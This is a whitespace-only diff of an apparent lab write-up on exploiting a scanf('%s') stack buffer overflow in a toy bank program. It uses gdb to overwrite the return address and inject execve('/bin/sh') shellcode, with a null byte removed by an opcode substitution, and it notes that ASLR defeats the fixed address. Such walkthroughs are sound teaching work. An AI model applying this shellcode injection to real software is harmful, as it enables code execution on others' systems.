@@ -220,9 +220,9 @@ Inspect the registers:
 ```
 (gdb) info registers
 ...
-ebp            0x41414141	0x41414141
+ebp            0x41414141  0x41414141
 ...
-eip            0x41414141	0x41414141                  
+eip            0x41414141  0x41414141                  
 ```
 
 As shown above, the `eip` (instruction pointer) and `ebp` (stack base pointer) registers have been overwritten with `0x41414141`, which is "AAAA" in hex. The payload has successfully overwritten the instruction pointer, which can control the flow of the program.
@@ -230,7 +230,7 @@ As shown above, the `eip` (instruction pointer) and `ebp` (stack base pointer) r
 Examine the instruction pointer:
 ```
 (gdb) x $eip 
-0x41414141:	Cannot access memory at address 0x41414141
+0x41414141: Cannot access memory at address 0x41414141
 ```
 
 The program cannot access the memory at the overwritten address `0x41414141`, which results in a segmentation fault.
@@ -285,11 +285,11 @@ Options:
 [2] Deposit
 [3] Check Balance
 [4] Exit
-Enter your choice: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
-0xffffdd7c:	0x08049489	0x0804a137	0xffffdd9c	0xffffdda8
-0xffffdd8c:	0x08049464	0x00000001	0xffffde54	0xffffde5c
-0xffffdd9c:	0x0804950b	0xffffddc0	0x00000000	0x00000000
-0xffffddac:	0xf7df0e81	0xf7fb0000	0xf7fb0000	0x00000000
+Enter your choice: => 0x8049080 <__isoc99_scanf@plt>:  jmp    DWORD PTR ds:0x804c020
+0xffffdd7c: 0x08049489  0x0804a137  0xffffdd9c  0xffffdda8
+0xffffdd8c: 0x08049464  0x00000001  0xffffde54  0xffffde5c
+0xffffdd9c: 0x0804950b  0xffffddc0  0x00000000  0x00000000
+0xffffddac: 0xf7df0e81  0xf7fb0000  0xf7fb0000  0x00000000
 
 Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
 (gdb) c
@@ -300,11 +300,11 @@ Continuing.
 | |_) |__) \__ \| | | |_) / ___ \| | | | . \
 |_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
 
-Captcha: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
-0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
-0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
-0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
-0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+Captcha: => 0x8049080 <__isoc99_scanf@plt>:  jmp    DWORD PTR ds:0x804c020
+0xffffd94c: 0x08049221  0x0804a0f7  0xffffd974  0x00000002
+0xffffd95c: 0x080491c1  0x00010001  0x00381ea0  0x62808426
+0xffffd96c: 0x62547333  0x004b6e41  0xffffd970  0xf7fdf289
+0xffffd97c: 0x000000d5  0xf7dd9cb8  0x677f9a5f  0xf7fd0110
 
 Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
 ```
@@ -313,11 +313,11 @@ Use the `finish` command after the captcha's `scanf` call:
 ```
 (gdb) finish
 Run till exit from #0  0x08049080 in __isoc99_scanf@plt ()
-=> 0x8049221:	add    esp,0x10
-0xffffd950:	0x0804a0f7	0xffffd974	0x00000002	0x080491c1
-0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
-0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
-0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+=> 0x8049221:   add    esp,0x10
+0xffffd950: 0x0804a0f7  0xffffd974  0x00000002  0x080491c1
+0xffffd960: 0x00010001  0x00381ea0  0x62808426  0x62547333
+0xffffd970: 0x004b6e41  0x41414141  0x41414141  0x41414141
+0xffffd980: 0x41414141  0x41414141  0x41414141  0x41414141
 0x08049221 in ?? ()
 ```
 
@@ -331,52 +331,52 @@ Upon return, the value returned is printed and put in the value history.
 
 At this point `scanf` has already scanned in the payload of "A"s, which are visible on the stack as `0x41414141`:
 ```
-0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
-0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd970: 0x004b6e41  0x41414141  0x41414141  0x41414141
+0xffffd980: 0x41414141  0x41414141  0x41414141  0x41414141
 ```
 
 Now that `scanf` has completed, the program returned to the `captcha` function. Examine about 30 instructions starting from the current instruction.
 ```
 (gdb) x/30i $eip
-=> 0x8049221:	add    esp,0x10
-   0x8049224:	sub    esp,0x4
-   0x8049227:	push   0x8
-   0x8049229:	lea    eax,[ebp-0x3fd]
-   0x804922f:	push   eax
-   0x8049230:	lea    eax,[ebp-0x3f4]
-   0x8049236:	push   eax
-   0x8049237:	call   0x8049090 <strncmp@plt>
-   0x804923c:	add    esp,0x10
-   0x804923f:	test   eax,eax
-   0x8049241:	jne    0x804925c
-   0x8049243:	sub    esp,0xc
-   0x8049246:	lea    eax,[ebx-0x1f06]
-   0x804924c:	push   eax
-   0x804924d:	call   0x8049050 <puts@plt>
-   0x8049252:	add    esp,0x10
-   0x8049255:	mov    eax,0x1
-   0x804925a:	jmp    0x8049273
-   0x804925c:	sub    esp,0xc
-   0x804925f:	lea    eax,[ebx-0x1efc]
-   0x8049265:	push   eax
-   0x8049266:	call   0x8049050 <puts@plt>
-   0x804926b:	add    esp,0x10
-   0x804926e:	mov    eax,0x0
-   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
-   0x8049276:	leave  
-   0x8049277:	ret    
-   0x8049278:	push   ebp
-   0x8049279:	mov    ebp,esp
-   0x804927b:	push   ebx  
+=> 0x8049221:   add    esp,0x10
+   0x8049224:   sub    esp,0x4
+   0x8049227:   push   0x8
+   0x8049229:   lea    eax,[ebp-0x3fd]
+   0x804922f:   push   eax
+   0x8049230:   lea    eax,[ebp-0x3f4]
+   0x8049236:   push   eax
+   0x8049237:   call   0x8049090 <strncmp@plt>
+   0x804923c:   add    esp,0x10
+   0x804923f:   test   eax,eax
+   0x8049241:   jne    0x804925c
+   0x8049243:   sub    esp,0xc
+   0x8049246:   lea    eax,[ebx-0x1f06]
+   0x804924c:   push   eax
+   0x804924d:   call   0x8049050 <puts@plt>
+   0x8049252:   add    esp,0x10
+   0x8049255:   mov    eax,0x1
+   0x804925a:   jmp    0x8049273
+   0x804925c:   sub    esp,0xc
+   0x804925f:   lea    eax,[ebx-0x1efc]
+   0x8049265:   push   eax
+   0x8049266:   call   0x8049050 <puts@plt>
+   0x804926b:   add    esp,0x10
+   0x804926e:   mov    eax,0x0
+   0x8049273:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x8049276:   leave  
+   0x8049277:   ret    
+   0x8049278:   push   ebp
+   0x8049279:   mov    ebp,esp
+   0x804927b:   push   ebx  
 ```
 
 Notice that these instructions match with the `captcha` function in [bank.c](bank.c):
 | Assembly               | bank.c  |
 | :----------------------------- | :------- |
-| `0x8049237:	call   0x8049090 <strncmp@plt>` | `strncmp(userCaptcha,(char *)&b3sT,8);`
-| `0x8049241:	jne    0x804925c` | `if (result != 0)`
-| `0x804924d:	call   0x8049050 <puts@plt>` | `puts("Correct!\n");`
-| `0x8049266:	call   0x8049050 <puts@plt>` | `puts("Incorrect!\n");`
+| `0x8049237:   call   0x8049090 <strncmp@plt>` | `strncmp(userCaptcha,(char *)&b3sT,8);`
+| `0x8049241:   jne    0x804925c` | `if (result != 0)`
+| `0x804924d:   call   0x8049050 <puts@plt>` | `puts("Correct!\n");`
+| `0x8049266:   call   0x8049050 <puts@plt>` | `puts("Incorrect!\n");`
 
 Set a breakpoint at the `leave` instruction:
 ```
@@ -402,19 +402,19 @@ Continue the program until it hits the `0x8049276` breakpoint. Then step instruc
 Continuing.
 Incorrect!
 
-=> 0x8049276:	leave  
-0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
-0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
-0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141
+=> 0x8049276:   leave  
+0xffffd960: 0x00010001  0x00381ea0  0x62808426  0x62547333
+0xffffd970: 0x004b6e41  0x41414141  0x41414141  0x41414141
+0xffffd980: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd990: 0x41414141  0x41414141  0x41414141  0x41414141
 
 Breakpoint 2, 0x08049276 in ?? ()
 (gdb) si
-=> 0x8049277:	ret    
-0xffffdd6c:	0x0804928f	0xf7fb0000	0x00000000	0xffffdda8
-0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
-0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
-0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
+=> 0x8049277:   ret    
+0xffffdd6c: 0x0804928f  0xf7fb0000  0x00000000  0xffffdda8
+0xffffdd7c: 0x08049489  0x0804a137  0x0804c000  0xffffdda8
+0xffffdd8c: 0x080494b1  0x00000001  0xffffde54  0xffffde5c
+0xffffdd9c: 0x00000001  0xffffddc0  0x00000000  0x00000000
 0x08049277 in ?? ()
 (gdb) 
 ```
@@ -422,22 +422,22 @@ Breakpoint 2, 0x08049276 in ?? ()
 At this point the `ret` function is about to pop the top of the stack (`0x0804928f`) and return to that address. Step again to see this:
 ```
 (gdb) si
-=> 0x804928f:	test   eax,eax
-0xffffdd70:	0xf7fb0000	0x00000000	0xffffdda8	0x08049489
-0xffffdd80:	0x0804a137	0x0804c000	0xffffdda8	0x080494b1
-0xffffdd90:	0x00000001	0xffffde54	0xffffde5c	0x00000001
-0xffffdda0:	0xffffddc0	0x00000000	0x00000000	0xf7df0e81
+=> 0x804928f:   test   eax,eax
+0xffffdd70: 0xf7fb0000  0x00000000  0xffffdda8  0x08049489
+0xffffdd80: 0x0804a137  0x0804c000  0xffffdda8  0x080494b1
+0xffffdd90: 0x00000001  0xffffde54  0xffffde5c  0x00000001
+0xffffdda0: 0xffffddc0  0x00000000  0x00000000  0xf7df0e81
 0x0804928f in ?? ()
 ```
 
 The program returned to the function that called `captcha`, which is the `withdraw` function in this case. Step a few more instructions to get the `ret`:
 ```
 (gdb) si
-=> 0x8049306:	ret    
-0xffffdd04:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffdd14:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffdd24:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffdd34:	0x41414141	0x41414141	0x41414141	0x41414141
+=> 0x8049306:   ret    
+0xffffdd04: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffdd14: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffdd24: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffdd34: 0x41414141  0x41414141  0x41414141  0x41414141
 0x08049306 in ?? ()
 (gdb) 
 ```
@@ -445,13 +445,13 @@ The program returned to the function that called `captcha`, which is the `withdr
 The program is about to pop the top of the stack and return to that address. However, the stack is filled with the payload of "A"s. When the program returns to address `0x41414141`, it segfaults:
 ```
 (gdb) si
-=> 0x41414141:	Error while running hook_stop:
+=> 0x41414141:  Error while running hook_stop:
 Cannot access memory at address 0x41414141
 0x41414141 in ?? ()
 (gdb) si
 
 Program received signal SIGSEGV, Segmentation fault.
-=> 0x41414141:	Error while running hook_stop:
+=> 0x41414141:  Error while running hook_stop:
 Cannot access memory at address 0x41414141
 0x41414141 in ?? ()
 ```
@@ -469,19 +469,19 @@ Run the program again with this new payload. Continue until breakpoint at `0x080
 Continuing.
 Incorrect!
 
-=> 0x8049276:	leave  
-0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
-0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
-0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141
+=> 0x8049276:   leave  
+0xffffd960: 0x00010001  0x00381ea0  0x62808426  0x62547333
+0xffffd970: 0x004b6e41  0x41414141  0x41414141  0x41414141
+0xffffd980: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd990: 0x41414141  0x41414141  0x41414141  0x41414141
 
 Breakpoint 2, 0x08049276 in ?? ()
 (gdb) si
-=> 0x8049277:	ret    
-0xffffdd6c:	0x43434343	0xf7fb0000	0x00000000	0xffffdda8
-0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
-0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
-0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
+=> 0x8049277:   ret    
+0xffffdd6c: 0x43434343  0xf7fb0000  0x00000000  0xffffdda8
+0xffffdd7c: 0x08049489  0x0804a137  0x0804c000  0xffffdda8
+0xffffdd8c: 0x080494b1  0x00000001  0xffffde54  0xffffde5c
+0xffffdd9c: 0x00000001  0xffffddc0  0x00000000  0x00000000
 0x08049277 in ?? ()
 ```
 
@@ -498,18 +498,18 @@ First, find a good address to return to. Open up gdb. Run the program again with
 ...
 Breakpoint 2, 0x08049276 in ?? ()
 (gdb) si
-=> 0x8049277:	ret    
-0xffffdd6c:	0x0804928f	0xf7fb0000
+=> 0x8049277:   ret    
+0xffffdd6c: 0x0804928f  0xf7fb0000
 ...
 (gdb) x $esp
-0xffffdd6c:	0x0804928f
+0xffffdd6c: 0x0804928f
 ```
 
 The stack pointer `esp` is at `0xffffdd6c`. And the stack looks like this:
 ```
             return address
             v
-0xffffdd6c:	0x0804928f	0xf7fb0000
+0xffffdd6c: 0x0804928f  0xf7fb0000
 ^                       ^
 $esp address            payload starts here = $esp + 4
 ```
@@ -522,9 +522,9 @@ eip = 0xffffdd6c + 4
 Use the shell code LiveOverflow suggested by [Shell Storm: Linux x86 execve("/bin/sh")][5]:
 ```
 /*
-Title:	Linux x86 execve("/bin/sh") - 28 bytes
-Author:	Jean Pascal Pereira <pereira@secbiz.de>
-Web:	http://0xffe4.org
+Title:  Linux x86 execve("/bin/sh") - 28 bytes
+Author: Jean Pascal Pereira <pereira@secbiz.de>
+Web:    http://0xffe4.org
 
 
 Disassembly of section .text:
@@ -576,18 +576,18 @@ Run this script and run the payload in gdb. Pause at breakpoint `0x08049276`:
 ...
 Breakpoint 2, 0x08049276 in ?? ()
 (gdb) si
-=> 0x8049277:	ret    
-0xffffdd6c:	0xffffdd70	0x6850c031
+=> 0x8049277:   ret    
+0xffffdd6c: 0xffffdd70  0x6850c031
 ```
 
 This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd6c + 4`) just as intended. However, continue the program and it segfaults. Why?
 
 Examine the stack and make sure everything else is in place. The return address is definitely correct:
 ```
-=> 0x8049277:	ret
+=> 0x8049277:   ret
             return address is correct
             v
-0xffffdd6c:	0xffffdd70  0x6850c031
+0xffffdd6c: 0xffffdd70  0x6850c031
 ```
 
 What about the payload? Compare the intended payload with the stack contents. It is easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
@@ -595,17 +595,17 @@ What about the payload? Compare the intended payload with the stack contents. It
 (gdb) x/48bx $esp+4
 intended payload address
 v
-0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68  # stack
+0xffffdd70: 0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68  # stack
             \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload
             
-0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89  # stack
+0xffffdd78: 0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x89  # stack
             \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload
 
-0xffffdd80:	0xc1	0x89	0xc2	0xb0	0x00	0xc0	0x04	0x08  # stack
+0xffffdd80: 0xc1    0x89    0xc2    0xb0    0x00    0xc0    0x04    0x08  # stack
             \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \x31  # payload
                                             ^ starting from this byte, the payload and stack do not match
 
-0xffffdd88:	0xa8	0xdd	0xff	0xff	0xb1	0x94	0x04	0x08  # stack
+0xffffdd88: 0xa8    0xdd    0xff    0xff    0xb1    0x94    0x04    0x08  # stack
             \xc0    \x40    \xcd    \x80                                  # payload
 ...
 ```
@@ -650,10 +650,10 @@ Now get the opcodes of these instructions. Create a new file called [movb.asm](m
 ```
 global _start
 _start:
-	mov al, 255		
-	sub al, 244 
-	mov eax, 1		; sys_exit system call
-	int 0x80		; interrupt for system call
+    mov al, 255
+    sub al, 244
+    mov eax, 1      ; sys_exit system call
+    int 0x80        ; interrupt for system call
 ```
 
 Compile and run it with gdb:
@@ -682,17 +682,17 @@ End with a line saying just "end".
 >end
 (gdb) run
 Starting program: /assembly/a2.out 
-eax            0x0	0
-=> 0x8048060 <_start>:	mov    al,0xff
+eax            0x0  0
+=> 0x8048060 <_start>:  mov    al,0xff
 
 Breakpoint 1, 0x08048060 in _start ()
 (gdb) si
-eax            0xff	255
-=> 0x8048062 <_start+2>:	sub    al,0xf4
+eax            0xff 255
+=> 0x8048062 <_start+2>:    sub    al,0xf4
 0x08048062 in _start ()
 (gdb) si
-eax            0xb	11
-=> 0x8048064 <_start+4>:	mov    eax,0x1
+eax            0xb  11
+=> 0x8048064 <_start+4>:    mov    eax,0x1
 0x08048064 in _start ()
 (gdb) 
 ```
@@ -706,22 +706,22 @@ Now grab the actual opcodes for these instructions. Run the program again. Exami
 ```
 (gdb) run
 ...
-eax            0x0	0
-=> 0x8048060 <_start>:	mov    al,0xff
+eax            0x0  0
+=> 0x8048060 <_start>:  mov    al,0xff
 
 Breakpoint 1, 0x08048060 in _start ()
 (gdb) x/3i $eip
-=> 0x8048060 <_start>:	    mov    al,0xff
-   0x8048062 <_start+2>:	sub    al,0xf4
-   0x8048064 <_start+4>:	mov    eax,0x1
+=> 0x8048060 <_start>:      mov    al,0xff
+   0x8048062 <_start+2>:    sub    al,0xf4
+   0x8048064 <_start+4>:    mov    eax,0x1
 ```
 
 From the first instruction to the next is a difference of two bytes from `0x8048060 <_start>` to `0x8048062 <_start+2>`. The same is true for the second to third instructions. Therefore, both `mov al,0xff` and `sub al,0xf4` instructions are two bytes long. Inspect two bytes from `eip` at those intervals to view the opcodes:
 ```
 (gdb) x/2bx $eip
-0x8048060 <_start>:	    0xb0	0xff
+0x8048060 <_start>:     0xb0    0xff
 (gdb) x/2bx $eip+2
-0x8048062 <_start+2>:	0x2c	0xf4
+0x8048062 <_start+2>:   0x2c    0xf4
 ```
 
 This table summarizes the instructions and their corresponding opcodes found:
@@ -756,16 +756,16 @@ with open("payload", "wb") as handle:
 Run the payload in gdb and stop at the `0x8049277: ret` instruction. Examine the stack and verify that the entire payload made it:
 ```
 (gdb) x/48bx $esp+4
-0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68    # stack
+0xffffdd70: 0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68    # stack
             \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68    # payload
 
-0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89    # stack
+0xffffdd78: 0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x89    # stack
             \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89    # payload
 
-0xffffdd80:	0xc1	0x89	0xc2	0xb0	0xff	0x2c	0xf4	0xcd    # stack
+0xffffdd80: 0xc1    0x89    0xc2    0xb0    0xff    0x2c    0xf4    0xcd    # stack
             \xc1    \x89    \xc2    \xb0    \xff    \x2c    \xf4    \xcd    # payload
 
-0xffffdd88:	0x80	0x31	0xc0	0x40	0xcd	0x80	0x00	0x08    # stack
+0xffffdd88: 0x80    0x31    0xc0    0x40    0xcd    0x80    0x00    0x08    # stack
             \x80    \x31    \xc0    \x40    \xcd    \x80    ^ null          # payload
 ```
 
@@ -805,7 +805,7 @@ Set a breakpoint at the familiar `0x8049276` address and continue:
 Enter input as normal in the bank's terminal window until the breakpoint hits in the gdb window. Once the breakpoint hits, examine the stack pointer `esp`:
 ```
 (gdb) info registers esp
-esp            0xffa73dd0	0xffa73dd0
+esp            0xffa73dd0   0xffa73dd0
 ```
 
 This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address used in gdb cannot be used in a live program. Furthermore, gdb has ASLR turned off by default for easier debugging. To turn ASLR on, use this command:
@@ -894,20 +894,20 @@ Stop at the instruction just after the printf completes:
 | |_) |__) \__ \| | | |_) / ___ \| | | | . \
 |_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
 
-=> 0x8049040 <printf@plt>:	jmp    DWORD PTR ds:0x804c010
-0xffffd94c:	0x08049208	0x0804a0ed	0xf7fd676c	0x00000002
-0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
-0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
-0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+=> 0x8049040 <printf@plt>:  jmp    DWORD PTR ds:0x804c010
+0xffffd94c: 0x08049208  0x0804a0ed  0xf7fd676c  0x00000002
+0xffffd95c: 0x080491c1  0x00010001  0x00381ea0  0x62808426
+0xffffd96c: 0x62547333  0x004b6e41  0xffffd970  0xf7fdf289
+0xffffd97c: 0x000000d5  0xf7dd9cb8  0x677f9a5f  0xf7fd0110
 
 Breakpoint 3, 0x08049040 in printf@plt ()
 (gdb) finish
 Run till exit from #0  0x08049040 in printf@plt ()
-Captcha: => 0x8049208:	add    esp,0x10
-0xffffd950:	0x0804a0ed	0xf7fd676c	0x00000002	0x080491c1
-0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
-0xffffd970:	0x004b6e41	0xffffd970	0xf7fdf289	0x000000d5
-0xffffd980:	0xf7dd9cb8	0x677f9a5f	0xf7fd0110	0xf7fdf73d
+Captcha: => 0x8049208:  add    esp,0x10
+0xffffd950: 0x0804a0ed  0xf7fd676c  0x00000002  0x080491c1
+0xffffd960: 0x00010001  0x00381ea0  0x62808426  0x62547333
+0xffffd970: 0x004b6e41  0xffffd970  0xf7fdf289  0x000000d5
+0xffffd980: 0xf7dd9cb8  0x677f9a5f  0xf7fd0110  0xf7fdf73d
 0x08049208 in ?? ()
 (gdb) 
 ```
@@ -915,17 +915,17 @@ Captcha: => 0x8049208:	add    esp,0x10
 Which is instruction 0x8049208. Set a breakpoint at 0x8049208. Examine 10 instructions from 0x8049208.
 ```
 (gdb) x/10i $eip
-=> 0x8049208:	add    esp,0x10
-   0x804920b:	sub    esp,0x8
-   0x804920e:	lea    eax,[ebp-0x3f4]      ; 0x3f4 = 1012, likely the location to store the captcha input
-   0x8049214:	push   eax
-   0x8049215:	lea    eax,[ebx-0x1f09]     ; 
-   0x804921b:	push   eax
-   0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
-   0x8049221:	add    esp,0x10
+=> 0x8049208:   add    esp,0x10
+   0x804920b:   sub    esp,0x8
+   0x804920e:   lea    eax,[ebp-0x3f4]      ; 0x3f4 = 1012, likely the location to store the captcha input
+   0x8049214:   push   eax
+   0x8049215:   lea    eax,[ebx-0x1f09]     ; 
+   0x804921b:   push   eax
+   0x804921c:   call   0x8049080 <__isoc99_scanf@plt>
+   0x8049221:   add    esp,0x10
    ...
 (gdb) x/s $ebx-0x1f09
-0x804a0f7:	"%s"
+0x804a0f7:  "%s"
 ```
 
 Placeholder
@@ -941,11 +941,11 @@ Continue the program until the scanf breakpoint hits:
 ```
 (gdb) c
 Continuing.
-=> 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
-0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
-0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
-0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
-0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+=> 0x8049080 <__isoc99_scanf@plt>:  jmp    DWORD PTR ds:0x804c020
+0xffffd94c: 0x08049221  0x0804a0f7  0xffffd974  0x00000002
+0xffffd95c: 0x080491c1  0x00010001  0x00381ea0  0x62808426
+0xffffd96c: 0x62547333  0x004b6e41  0xffffd970  0xf7fdf289
+0xffffd97c: 0x000000d5  0xf7dd9cb8  0x677f9a5f  0xf7fd0110
 
 Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
 ```
@@ -954,15 +954,15 @@ Examine the first three values of the stack:
 ```     
             %s
             v
-0x08049221	0x0804a0f7	0xffffd974
+0x08049221  0x0804a0f7  0xffffd974
 ^                       ^
 return address          address to write to
 ```
 
 `0x08049221` is the return address:
 ```
-0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
-0x8049221:	add    esp,0x10
+0x804921c:  call   0x8049080 <__isoc99_scanf@plt>
+0x8049221:  add    esp,0x10
 ^ 
 this is the return address after the scanf call completes
 ```
@@ -970,7 +970,7 @@ this is the return address after the scanf call completes
 `0x0804a0f7` is `%s`:
 ```
 (gdb) x/s 0x0804a0f7
-0x804a0f7:	"%s"
+0x804a0f7:  "%s"
 ```
 
 Check if %s is always at address: 0x804a0f7. Yes it is. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
@@ -978,7 +978,7 @@ Check if %s is always at address: 0x804a0f7. Yes it is. According to [Wikipedia]
 `0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
 ```
 (gdb) x/s 0xffffd974
-0xffffd974:	'A' <repeats 200 times>...
+0xffffd974: 'A' <repeats 200 times>...
 ```
 
 ### New Section
